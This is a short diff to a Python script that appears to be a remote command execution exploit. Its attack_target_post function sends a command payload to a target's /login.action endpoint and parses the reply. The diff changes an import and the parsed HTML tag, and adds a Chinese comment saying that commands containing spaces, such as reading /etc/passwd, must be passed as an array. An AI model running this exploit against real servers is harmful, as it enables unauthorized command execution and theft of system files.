@@ -1,5 +1,5 @@
 import requests
-import base_def
+from lib import base_def
 import argparse
 import urllib
 from urllib import parse
@@ -38,7 +38,7 @@ def attack_target_post(url, args, header, proxies, post_command):
     response = requests.post(url + "/login.action", data=post_command, proxies=proxies, headers=header)
     if response.status_code == 200:
         soup_res = bs4.BeautifulSoup(response.text, 'html.parser')
-        result = soup_res.find_all('table')
+        result = soup_res.find_all('body')
     return result
 
 
@@ -49,6 +49,7 @@ if __name__ == "__main__":
     argparse = base_def.start_help(arg_parser)
     proxies = base_def.default_proxies()
     header = base_def.default_header()
+    #根据exp，如果命令是带空格的，就需要将shell_command的字符串变成数组：["cat","/etc/passwd"]
     shell_command = "pwd"
     #--------------------------------------------
 
